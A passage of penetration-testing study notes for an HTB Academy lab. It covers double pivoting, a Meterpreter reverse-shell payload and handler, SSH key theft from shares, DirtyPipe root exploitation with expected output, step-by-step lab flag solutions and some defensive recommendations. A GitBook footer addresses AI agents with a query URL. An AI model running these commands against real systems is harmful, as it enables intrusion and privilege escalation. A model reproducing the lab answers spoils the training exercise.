+- Service account analysis
+- GPO security review
+- Trust relationship assessment
+- Certificate template analysis
+```
+
+## 🌐 Protected Network Access
+
+### 🔍 Management Network Discovery
+
+```cmd wrap
+# Target: 172.16.9.0/23 subnet (management network)
+# Goal: Access "crown jewels" servers
+# Challenge: Should not be directly accessible from principal domain
+
+# Network topology:
+Attack Host → dmz01 (172.16.8.120) → DC01 (172.16.9.3) → MGMT01 (172.16.9.25)
+```
+
+### 🗝️ SSH Key Discovery
+
+```bash wrap
+# SSH private key location:
+C:\Department Shares\IT\Private\Networking\
+
+# Available keys:
+ssmallsadm-id_rsa    # Management network access
+[other_user]-id_rsa  # Additional network access
+[admin_user]-id_rsa  # Privileged access keys
+
+# Key extraction via Evil-WinRM:
+download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" ./ssmallsadm-key
+```
+
+## 🔄 Double Pivot Configuration
+
+### 🛠️ Complex Tunneling Setup
+
+```bash wrap
+# Phase 1: SSH Local Port Forwarding (Attack → DMZ01)
+ssh -i id_rsa -L 5985:172.16.8.3:5985 root@DMZ01_IP
+# Result: Local WinRM access to DC01
+
+# Phase 2: SSH Reverse Port Forwarding (DMZ01 → Attack)  
+ssh -i id_rsa -R 1234:ATTACK_IP:8443 root@DMZ01_IP
+# Result: Reverse tunnel for DC01 → Attack host communication
+
+# Phase 3: Meterpreter Payload Chain
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o dc_shell.exe
+# Target: DMZ01 internal interface, tunneled to attack host
+```
+
+### 🎯 Metasploit Routing Configuration
+
+```bash wrap
+# Multi/handler setup
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8443
+run
+
+# DC01 payload execution
+.\dc_shell.exe
+# Result: Meterpreter session through double tunnel
+
+# Route addition for management network
+run autoroute -s 172.16.9.0/23
+# Result: Direct access to protected subnet
+
+# SOCKS proxy establishment
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 4a
+run
+# Result: ProxyChains access to 172.16.9.0/23
+```
+
+## 🖥️ MGMT01 Host Compromise
+
+### 🔑 SSH Key Authentication
+
+```bash wrap
+# Management network connectivity test
+proxychains nmap -sT -p 22 172.16.9.25
+# Result: SSH service accessible
+
+# SSH key authentication
+chmod 600 ssmallsadm-key
+proxychains ssh -i ssmallsadm-key ssmallsadm@172.16.9.25
+
+# Successful access:
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)
+ssmallsadm@MGMT01:~$
+```
+
+### 🔍 System Information Gathering
+
+```bash wrap
+# Kernel version analysis
+uname -a
+# Output: Linux MGMT01 5.10.0-051000-generic #202012132330 SMP
+
+# Vulnerability research:
+CVE-2022-0847 (DirtyPipe) - Kernel 5.10.0 vulnerable
+# Impact: Local privilege escalation to root
+
+# SUID binary enumeration
+find / -perm -4000 2>/dev/null
+# Target: /usr/lib/openssh/ssh-keysign
+```
+
+## 🔺 DirtyPipe Privilege Escalation
+
+### 💥 CVE-2022-0847 Exploitation
+
+```bash wrap
+# Exploit acquisition
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cat exploit-2.c  # Copy exploit code
+
+# Target system compilation
+vim exploit.c  # Paste exploit code
+gcc exploit.c -o dirtypipe
+chmod +x dirtypipe
+
+# SUID binary exploitation
+./dirtypipe /usr/lib/openssh/ssh-keysign
+
+# Expected output:
+[+] hijacking suid binary..
+[+] dropping suid shell..
+[+] restoring suid binary..
+[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+
+# Root access verification:
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(ssmallsadm)
+```
+
+### 🏆 Management Network Compromise
+
+```cmd wrap
+# Achievement summary:
+- Protected network access achieved
+- Management server root compromise
+- "Crown jewels" server access demonstrated
+- Complete network segmentation bypass
+
+# Impact demonstration:
+- Access to sensitive management infrastructure
+- Potential for additional network discovery
+- Complete enterprise environment compromise
+```
+
+## 🎯 Additional Value-Add Activities
+
+### 💰 Sensitive Data Discovery
+
+```bash wrap
+# File share enumeration with Domain Admin access
+*Evil-WinRM* PS C:\> cd "C:\Department Shares"
+*Evil-WinRM* PS C:\Department Shares> dir
+
+# High-value targets:
+Accounting/     # Financial data access
+Executives/     # Executive communications  
+Finance/        # Budget and financial planning
+HR/            # Employee personal information
+R&D/           # Intellectual property and research
+
+# Evidence collection:
+- Screenshot file listings (do not open individual files)
+- Document access capabilities
+- Assess data classification requirements
+```
+
+### 🔍 Data Exfiltration Testing
+
+```cmd wrap
+# DLP capability assessment (with client approval):
+- Test various exfiltration methods
+- Evaluate detection capabilities
+- Use mock data only (no real sensitive data)
+- Document detection/prevention results
+
+# Common exfiltration vectors:
+- Email attachments
+- Cloud storage uploads
+- DNS tunneling
+- Encrypted channels
+- USB device simulation
+```
+
+### 🌐 Domain Trust Exploitation
+
+```cmd wrap
+# Trust relationship analysis:
+- Child → Parent domain trusts
+- Intra-forest trust relationships
+- External forest trusts
+- Cross-domain privilege escalation
+
+# Attack scenarios:
+- Kerberoasting across trusts
+- Golden ticket attacks
+- Inter-domain privilege escalation
+- Partner domain compromise impact
+```
+
+## 📋 Professional Reporting Enhancement
+
+### 📊 Comprehensive Impact Assessment
+
+```cmd wrap
+# Quantitative metrics:
+- Total hosts compromised: [COUNT]
+- Credential pairs discovered: [COUNT]
+- Critical vulnerabilities identified: [COUNT]
+- Network segments accessed: [COUNT]
+- Data repositories accessible: [COUNT]
+
+# Qualitative impact:
+- Business process disruption potential
+- Intellectual property exposure risk
+- Financial data access capabilities
+- Regulatory compliance implications
+```
+
+### 🎯 Executive Summary Enhancements
+
+```cmd wrap
+# Business impact demonstration:
+- Complete network infrastructure access
+- Sensitive data repository compromise
+- Management network segmentation bypass
+- Crown jewels server access achievement
+
+# Risk prioritization:
+- Immediate remediation requirements
+- Short-term security improvements
+- Long-term strategic recommendations
+- Compliance and regulatory considerations
+```
+
+## 🎯 HTB Academy Labs
+
+### 📋 Final Lab Solutions
+
+```cmd wrap
+# Lab 1: Management Network Access
+1. Double pivot setup → SSH + Metasploit routing
+2. SSH key discovery → Department Shares enumeration
+3. Protected network access → 172.16.9.25 connectivity
+4. Management server access → ssmallsadm authentication
+5. Flag retrieval → User home directory
+
+# Lab 2: Root Privilege Escalation
+1. Kernel vulnerability identification → CVE-2022-0847
+2. DirtyPipe exploit compilation → gcc exploit.c
+3. SUID binary exploitation → ssh-keysign hijacking
+4. Root shell acquisition → uid=0 access
+5. Flag retrieval → /root/flag.txt
+```
+
+### 🔍 Advanced Techniques Demonstrated
+
+```cmd wrap
+# Complex pivoting:
+- Multi-hop network traversal
+- Reverse port forwarding chains
+- Metasploit routing integration
+- ProxyChains tunnel management
+
+# Post-compromise value:
+- Comprehensive domain analysis
+- Protected network access
+- Kernel exploitation techniques
+- Professional impact demonstration
+```
+
+## 🛡️ Comprehensive Defense Strategy
+
+### 🔒 Network Architecture
+
+```cmd wrap
+# Segmentation improvements:
+- Implement proper network isolation
+- Deploy next-generation firewalls
+- Restrict management network access
+- Monitor inter-segment communication
+
+# Access controls:
+- Implement privileged access management
+- Deploy jump boxes for administrative access
+- Restrict direct domain admin access
+- Implement just-in-time administration
+```
+
+### 🛡️ Detection and Response
+
+```cmd wrap
+# Monitoring enhancements:
+- Deploy advanced threat detection
+- Implement network traffic analysis
+- Monitor privileged account usage
+- Deploy endpoint detection and response
+
+# Incident response:
+- Develop compromise detection procedures
+- Implement automated response capabilities
+- Regular security assessment programs
+- Continuous security monitoring
+```
+
+## 🏆 Complete Enterprise Assessment Summary
+
+### 🎯 Full Attack Chain Achievement
+
+```cmd wrap
+# External → Domain Admin → Protected Network Root:
+
+Phase 1: External reconnaissance and web application testing
+Phase 2: Initial access via command injection and privilege escalation  
+Phase 3: Internal network pivoting and credential harvesting
+Phase 4: Lateral movement and Active Directory enumeration
+Phase 5: Domain compromise via targeted Kerberoasting and DCSync
+Phase 6: Protected network access and kernel exploitation
+
+# Total impact:
+- Complete enterprise network compromise
+- All network segments accessed
+- Sensitive data repositories compromised
+- Management infrastructure controlled
+```
+
+### 📋 Professional Assessment Value
+
+```cmd wrap
+# Client deliverables:
+- Comprehensive vulnerability assessment
+- Complete attack path documentation
+- Detailed remediation recommendations
+- Executive summary with business impact
+- Technical appendices with evidence
+- Password analysis and recommendations
+
+# Above-and-beyond value:
+- Active Directory security audit
+- Protected network assessment
+- Data classification review
+- Trust relationship analysis
+- Compliance gap identification
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/post-exploitation.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
